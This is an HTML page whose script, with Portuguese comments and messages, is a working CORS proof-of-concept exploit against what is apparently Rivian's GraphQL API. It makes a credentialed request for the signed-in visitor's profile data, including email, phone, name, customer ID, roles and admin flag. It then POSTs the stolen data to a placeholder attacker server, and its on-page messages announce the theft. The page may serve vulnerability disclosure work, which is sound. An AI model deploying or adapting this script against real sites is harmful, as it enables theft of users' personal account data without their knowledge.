<!DOCTYPE html>
<html>

<head>
  <title>Rivian CORS Data Exfiltration</title>
</head>

<body>
  <h1>Aguarde... Roubando seus dados da Rivian.</h1>
  <pre id="data"></pre>

  <script>
    const graphqlUrl = 'https://rivian.com/api/gql/gateway/graphql';
    const exfilServerUrl = 'http://servidor_em_questão:14455/log_data';

    const query = `
        {
            currentUser {
                email
                id
                firstName
                lastName
                phone
                locale
                username
                createdAt
                updatedAt
                preferredLocale
                customerId
                userId
                roles
                isAdmin
                __typename
            }
        }
    `;

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ query: query }),
      credentials: 'include'
    };

    const dataDisplay = document.getElementById('data');
    const statusDisplay = document.getElementById('status');

    fetch(graphqlUrl, options)
      .then(response => {
        const acaoHeader = response.headers.get('Access-Control-Allow-Origin');
        console.log('Access-Control-Allow-Origin recebido:', acaoHeader);

        if (!response.ok) {
          statusDisplay.className = 'error';
          throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}`);
        }
        return response.json();
      })
      .then(data => {
        if (data && data.data && data.data.currentUser) {
          const exfiltratedData = data.data.currentUser;
          dataDisplay.textContent = JSON.stringify(exfiltratedData, null, 2);
          statusDisplay.className = 'success';
          statusDisplay.textContent = 'Dados do usuário Rivian roubados com sucesso! Enviando para o servidor do atacante...';
          console.log('Dados roubados (visíveis no navegador):', exfiltratedData);

          fetch(exfilServerUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(exfiltratedData)
          })
            .then(res => {
              if (res.ok) {
                console.log('Dados enviados com sucesso para o servidor local!');
                statusDisplay.textContent += ' Dados enviados para o servidor local!';
              } else {
                console.error('Falha ao enviar dados para o servidor local:', res.statusText);
                statusDisplay.textContent += ' Erro ao enviar dados para o servidor local.';
              }
            })
            .catch(err => {
              console.error('Erro de rede ao tentar exfiltrar dados para o servidor local:', err);
              statusDisplay.textContent += ' Erro de rede ao tentar enviar dados para o servidor local.';
            });

        } else if (data && data.errors) {
          dataDisplay.textContent = JSON.stringify(data.errors, null, 2);
          statusDisplay.className = 'error';
          statusDisplay.textContent = 'Requisição GraphQL retornou erros (mas ainda é um CORS bypass):';
          console.error('Erros GraphQL:', data.errors);
        } else {
          dataDisplay.textContent = 'Nenhum dado do usuário encontrado ou formato inesperado.';
          statusDisplay.className = 'error';
          statusDisplay.textContent = 'Resposta inesperada do servidor.';
          console.log('Resposta completa inesperada:', data);
        }
      })
      .catch(error => {
        console.error('Erro ao tentar roubar dados:', error);
        dataDisplay.textContent = 'Erro ao tentar roubar os dados: ' + error.message;
        statusDisplay.className = 'error';
        statusDisplay.textContent = 'Erro durante a exfiltração de dados!';
      });
  </script>
</body>

</html>